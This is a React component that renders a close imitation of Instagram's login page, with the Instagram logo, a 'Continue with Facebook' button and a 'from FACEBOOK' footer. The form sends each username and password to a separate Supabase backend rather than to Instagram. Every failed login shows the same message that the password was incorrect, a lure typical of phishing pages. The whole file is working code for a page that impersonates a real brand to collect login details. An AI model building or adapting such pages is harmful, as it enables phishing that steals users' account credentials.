import { useState } from 'react'
import { supabase } from './lib/supabase'
import './App.css'

function App() {
  const [identifier, setIdentifier] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [loading, setLoading] = useState(false)
  const [message, setMessage] = useState('')
  const [success, setSuccess] = useState(false)

  const canSubmit = identifier.trim() !== '' && password.length >= 6

  const handleSubmit = async (event) => {
    event.preventDefault()
    setMessage('')
    setSuccess(false)
    setLoading(true)

    try {
      const { error } = await supabase.auth.signInWithPassword({
        email: identifier.trim(),
        password,
      })
      if (error) throw error

      setSuccess(true)
      setMessage('Logged in!')
    } catch (error) {
      console.error('Login error:', error)
      setMessage(
        'Sorry, your password was incorrect. Please double-check your password.'
      )
    } finally {
      setLoading(false)
    }
  }

  return (
    <main className="page">
      <div className="screen">
        <div className="language">English ⌄</div>

        <h1 className="logo">Instagram</h1>

        <button type="button" className="fb-btn">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="#fff" aria-hidden="true">
            <path d="M22 12a10 10 0 1 0-11.56 9.88v-6.99H7.9V12h2.54V9.8c0-2.5 1.49-3.89 3.77-3.89 1.09 0 2.24.2 2.24.2v2.46h-1.26c-1.24 0-1.63.77-1.63 1.56V12h2.78l-.44 2.89h-2.34v6.99A10 10 0 0 0 22 12z" />
          </svg>
          Continue with Facebook
        </button>

        <div className="separator">
          <span />
          <p>OR</p>
          <span />
        </div>

        <form onSubmit={handleSubmit}>
          <div className="field">
            <input
              type="text"
              placeholder="phone number, username, or email"
              value={identifier}
              onChange={(e) => setIdentifier(e.target.value)}
              autoComplete="username"
              maxLength={100}
            />
          </div>

          <div className="field">
            <input
              type={showPassword ? 'text' : 'password'}
              placeholder="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              autoComplete="current-password"
              className={password ? 'has-toggle' : ''}
            />
            {password && (
              <button
                type="button"
                className="show-btn"
                onClick={() => setShowPassword((s) => !s)}
              >
                {showPassword ? 'Hide' : 'Show'}
              </button>
            )}
          </div>

          <a className="forgot" href="#!">Forgot password?</a>

          <button
            type="submit"
            className="submit-btn"
            disabled={loading || !canSubmit}
          >
            {loading ? 'Logging in...' : 'Log In'}
          </button>

          {message && (
            <p
              role="status"
              className={`form-message ${success ? 'success' : 'error'}`}
            >
              {message}
            </p>
          )}
        </form>

        <p className="signup">
          Don't have an account? <a href="#!">sign up</a>
        </p>

        <footer>
          <span>from</span>
          <strong>FACEBOOK</strong>
        </footer>
      </div>
    </main>
  )
}

export default App